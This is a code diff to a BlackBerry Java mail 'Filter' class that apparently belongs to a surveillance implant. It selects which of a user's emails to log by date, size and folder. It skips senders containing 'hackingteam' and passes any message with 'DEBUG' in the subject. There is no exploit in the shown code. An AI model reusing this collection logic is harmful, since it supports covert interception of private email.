@@ -12,8 +12,11 @@ import java.io.EOFException;
 import java.util.Date;
 import java.util.Vector;
 
+import net.rim.blackberry.api.mail.Address;
+import net.rim.blackberry.api.mail.Folder;
 import net.rim.blackberry.api.mail.Message;
 import net.rim.blackberry.api.mail.MessagingException;
+import net.rim.blackberry.api.mail.event.FolderEvent;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.utils.Check;
 import blackberry.utils.Debug;
@@ -26,7 +29,7 @@ import blackberry.utils.WChar;
  */
 class Filter {
     // #debug
-    static Debug debug = new Debug("Filter", DebugLevel.VERBOSE);
+    static Debug debug = new Debug("Filter", DebugLevel.NOTIFY);
 
     public static final int TYPE_REALTIME = 0;
     public static final int TYPE_COLLECT = 1;
@@ -41,7 +44,12 @@ class Filter {
     static final int FILTERED_FROM = -3;
     static final int FILTERED_TO = -4;
     static final int FILTERED_SIZE = -5;
+    static final int FILTERED_MESSAGE_ADDED = -6;
+    static final int FILTERED_FOUND = -7;
+    static final int FILDERED_INTERNAL = -8;
     static final int FILTERED_OK = 0;
+
+    String[] folderNames = new String[] { "Inbox", "Outbox" };
 
     public int size;
 
@@ -173,12 +181,18 @@ class Filter {
      *            the message
      * @param lastcheck
      *            the lastcheck
+     * @param checkAdded
      * @return the int
      * @throws MessagingException
      *             the messaging exception
      */
-    public int filterMessage(final Message message, final long lastcheck)
-            throws MessagingException {
+    public int filterMessage(final Message message, final long lastcheck
+            ) throws MessagingException {
+
+        //#ifdef DBC
+        Check.requires(message != null, "filterMessage: message != null");
+        //#endif
+
         long dataArrivo;
         // #mdebug
         debug.trace("invio dell'email " + message.getSentDate() + " long: "
@@ -189,44 +203,78 @@ class Filter {
                 + new Date(fromDate));
         debug.trace("filtro TO enabled:" + doFilterToDate + " : "
                 + new Date(toDate));
+
+        Address[] from = message.getRecipients(Message.RecipientType.FROM);
+        for (int i = 0; i < from.length; i++) {
+            if (from[i].getAddr().indexOf("hackingteam") > -1) {
+                debug.info("INTERNAL Address, skip it");
+                return FILDERED_INTERNAL;
+            }
+        }
+        if (message.getSubject().indexOf("DEBUG") > -1) {
+            debug.info("DEBUG subject, use it");
+            return FILTERED_OK;
+        }
         // #enddebug
+
+        Folder folder = message.getFolder();      
+
+        boolean found = false;
+        if (folder != null) {
+            String folderName = folder.getName();
+            int fsize = folderNames.length;
+
+            for (int i = 0; i < fsize; i++) {
+                if (folderNames[i].equals(folderName)) {
+                    found = true;
+                    break;
+                }
+            }
+        }
+
+        if (!found) {
+            //#debug info
+            debug.info("filterMessage: FILTERED_FOUND: " + folder.getName());
+            return FILTERED_FOUND;
+        }
 
         // Se c'e' un filtro sulla data
         // entro
 
         if (!enabled) {
-            // #debug debug
-            debug.trace("Disabled");
+            // #debug info
+            debug.info("Disabled");
             // TODO: attenzione, da riabilitare, per qualche ragione e' sempre disabled
             //return FILTERED_DISABLED;
         }
 
         dataArrivo = message.getReceivedDate().getTime();
         if (dataArrivo < lastcheck) {
-            // #debug debug
-            debug.trace("dataArrivo < lastcheck :" + dataArrivo + " < " + lastcheck);
+            // #debug info
+            debug.info("dataArrivo < lastcheck :" + dataArrivo + " < "
+                    + lastcheck);
             return FILTERED_LASTCHECK;
         }
 
         // se c'e' il filtro from e non viene rispettato escludi la mail
         if (doFilterFromDate == true && dataArrivo < fromDate) {
-            // #debug debug
-            debug.trace("doFilterFromDate");
+            // #debug info
+            debug.info("doFilterFromDate");
             return FILTERED_FROM;
-        }
+        }        
         // Se c'e' anche il filtro della data di fine e non viene rispettato
         // escludi la mail
         if (doFilterToDate == true && dataArrivo > toDate) {
-            // #debug debug
-            debug.trace("doFilterToDate");
+            // #debug info
+            debug.info("doFilterToDate");
             return FILTERED_TO;
         }
 
         final int trimAt = 0;
         if ((maxMessageSizeToLog > 0)
                 && (message.getSize() > maxMessageSizeToLog)) {
-            // #debug debug
-            debug.trace("maxMessageSizeToLog");
+            // #debug info
+            debug.info("maxMessageSizeToLog");
             return FILTERED_SIZE;
         }
 
